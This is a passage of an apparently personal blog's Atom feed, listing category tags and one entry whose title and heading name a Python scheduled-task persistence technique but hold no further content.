+&lt;/ol></content><category scheme="https://if1sh.com/categories/%E9%9A%8F%E6%83%B3/" term="随想" label="随想"/><category scheme="https://if1sh.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" term="读书笔记" label="读书笔记"/></entry><entry><title type="text"/><link rel="alternate" type="text/html" href="https://if1sh.com/posts/vx_recycle_bin/20220314/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.md/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/><id>https://if1sh.com/posts/vx_recycle_bin/20220314/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.md/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</id><updated>2023-01-01T18:53:09+08:00</updated><published>0001-01-01T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">权限维持-py计划任务</summary><content type="html">&lt;h1 id="权限维持-py计划任务">权限维持-py计划任务&lt;/h1></content></entry></feed>
